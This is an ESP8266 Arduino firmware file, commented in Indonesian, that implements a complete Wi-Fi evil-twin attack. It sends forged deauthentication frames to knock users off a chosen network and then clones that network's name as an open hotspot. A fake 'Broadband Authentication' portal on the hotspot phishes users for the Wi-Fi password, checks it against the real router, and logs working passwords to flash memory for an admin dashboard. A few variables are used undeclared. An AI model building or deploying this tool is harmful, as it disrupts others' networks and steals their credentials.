#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h> // Tambahan untuk simpan file

// Library tambahan untuk OLED
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
}

// Konfigurasi OLED 0.66 64x48
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
#define OLED_RESET    -1 
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define LED_PIN 2

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;

// Fungsi Simpan ke pass.txt
void savePassword(String data) {
  File f = LittleFS.open("/pass.txt", "a"); // Mode 'a' untuk append (tambah baris baru)
  if (f) {
    f.println(data);
    f.close();
  }
}

// Fungsi Baca pass.txt untuk ditampilkan di Dashboard
String readPasswords() {
  if (!LittleFS.exists("/pass.txt")) return "Belum ada log.";
  File f = LittleFS.open("/pass.txt", "r");
  String content = "";
  while (f.available()) {
    content += f.readStringUntil('\n') + "<br>";
  }
  f.close();
  return content;
}

void updateOLED(String status) {
  display.clearDisplay(); // KUNCI: Menghapus tumpukan teks lama
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("GMpro87");
  display.println("-------");
  display.setCursor(0, 18);
  display.println(status);
  
  if(_selectedNetwork.ssid != "") {
    display.setCursor(0, 38);
    display.print("T:"); 
    display.println(_selectedNetwork.ssid.substring(0,8));
  }
  display.display();
}

void ledStrobo() {
  for(int i=0; i<30; i++) {
    digitalWrite(LED_PIN, LOW); delay(30);
    digitalWrite(LED_PIN, HIGH); delay(30);
  }
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// Dashboard Admin (Tanpa Sunat)
String _tempHTML = R"rawliteral(
<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>
<style>
  body { font-family: sans-serif; background: #0a0a0a; color: #d1d1d1; margin: 0; padding: 15px; text-align: center; }
  .content { max-width: 500px; margin: auto; background: #151515; padding: 20px; border-radius: 12px; border: 1px solid #333; }
  h1 { color: #ee2e24; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px; }
  .btns { margin-bottom: 20px; display: flex; justify-content: center; gap: 10px; }
  button { padding: 12px 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 11px;}
  .btn-act { background: #444; color: white; }
  .btn-act:disabled { background: #222; color: #666; cursor: not-allowed; }
  table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #1c1c1c; border-radius: 8px; overflow: hidden; }
  th { background: #333; color: #ee2e24; padding: 10px; font-size: 12px; }
  td { padding: 10px; border-bottom: 1px solid #282828; font-size: 11px; }
  .btn-sel { background: #555; color: white; padding: 6px 10px; border-radius: 4px; border: none; }
  .selected { background: #2e7d32 !important; color: white; font-weight: bold; }
  .log-box { margin-top: 20px; text-align: left; background: #000; padding: 10px; border-radius: 5px; font-size: 10px; color: #0f0; border: 1px solid #333; }
</style>
</head><body><div class='content'>
<h1>GMpro87</h1>
<div class='btns'>
<form style='display:inline-block;' method='post' action='/?deauth={deauth}'>
<button class='btn-act'{disabled}>{deauth_button}</button></form>
<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
<button class='btn-act'{disabled}>{hotspot_button}</button></form>
<form style='display:inline-block; padding-left:8px;' method='post' action='/?clear=1'>
<button class='btn-act' style='background:#800;'>Clear Log</button></form>
</div><table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Select</th></tr>
)rawliteral";

void handleResult() {
  int timeout = 0;
  updateOLED("Checking...");
  while (WiFi.status() != WL_CONNECTED && timeout < 25) {
    delay(500);
    timeout++;
  }

  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/';},2000);</script><body><h2 style='color:red;text-align:center;'>Password Salah!</h2></body></html>");
    updateOLED("WRONG PASS");
  } else {
    webServer.send(200, "text/html", "<html><body><h2 style='color:green;text-align:center;'>Password Benar! ESP Berhenti.</h2></body></html>");
    
    // Simpan ke memori internal
    String logEntry = "SSID: " + _selectedNetwork.ssid + " | PASS: " + _tryPassword;
    savePassword(logEntry);
    
    hotspot_active = false;
    deauthing_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("GMpro", "Sangkur87");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    
    _correct = logEntry;
    updateOLED("PASS SAVED!");
    ledStrobo();
  }
}

void handleIndex() {
  if (webServer.hasArg("clear")) {
    LittleFS.remove("/pass.txt");
    _correct = "";
  }
  
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") { deauthing_active = true; updateOLED("DEAUTH ON"); }
    else if (webServer.arg("deauth") == "stop") { deauthing_active = false; updateOLED("DEAUTH OFF"); }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
      updateOLED("EVIL ON");
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("GMpro", "Sangkur87");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
      updateOLED("EVIL OFF");
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      String bssidStr = bytesToStr(_networks[i].bssid, 6);
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bssidStr + "</td><td>" + String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" + bssidStr + "'>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bssidStr) _html += "<button class='btn-sel selected'>Selected</button></form></td></tr>";
      else _html += "<button class='btn-sel'>Select</button></form></td></tr>";
    }

    _html.replace("{deauth_button}", deauthing_active ? "Stop deauthing" : "Start deauthing");
    _html.replace("{deauth}", deauthing_active ? "stop" : "start");
    _html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
    _html.replace("{hotspot}", hotspot_active ? "stop" : "start");
    _html.replace("{disabled}", (_selectedNetwork.ssid == "") ? " disabled" : "");

    _html += "</table>";
    _html += "<div class='log-box'><strong>Stored Passwords:</strong><br>" + readPasswords() + "</div>";
    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      handleResult();
    } else {
      String portalHTML = R"rawliteral(
<!DOCTYPE html><html><head><title>Broadband Authentication</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body { color: #333; font-family: 'Arial', sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; }
nav { background: #ee2e24; color: #fff; padding: 1.5em 1em; text-align: center; border-bottom: 4px solid #d1271f; }
.main-content { background: #fff; margin: 20px auto; padding: 2em; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
input[type="submit"] { width: 100%; padding: 12px; background-color: #ee2e24; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
</style></head><body><nav><b>Broadband Authentication</b></nav>
<div class="main-content"><h1>Verifikasi Password</h1><p>Sesi anda berakhir, silakan masukkan kembali password Wi-Fi untuk menyambung.</p>
<form action="/"><input type="password" name="password" minlength="8" required><input type="submit" value="LOGIN"></form></div>
</body></html>
)rawliteral";
      webServer.send(200, "text/html", portalHTML);
    }
  }
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin(); // Mulai memori internal
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  Wire.begin(4, 5); 
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { Serial.println(F("OLED gagal")); }
  display.clearDisplay();
  updateOLED("Ready");

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro", "Sangkur87");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/CurrentTarget", []() {
    webServer.send(200, "text/plain", _selectedNetwork.ssid);
  });
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    led_state = !led_state;
    digitalWrite(LED_PIN, led_state);
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1; deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
  }

  if (hotspot_active && !deauthing_active) digitalWrite(LED_PIN, LOW); 
  else if (!hotspot_active && !deauthing_active) digitalWrite(LED_PIN, HIGH);

  static unsigned long scanNow = 0;
  if (millis() - scanNow >= 15000 && !hotspot_active && !deauthing_active) {
    int n = WiFi.scanNetworks();
    clearArray();
    if (n >= 0) {
      for (int i = 0; i < n && i < 16; ++i) {
        _networks[i].ssid = WiFi.SSID(i);
        for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
        _networks[i].ch = WiFi.channel(i);
      }
    }
    scanNow = millis();
  }
}
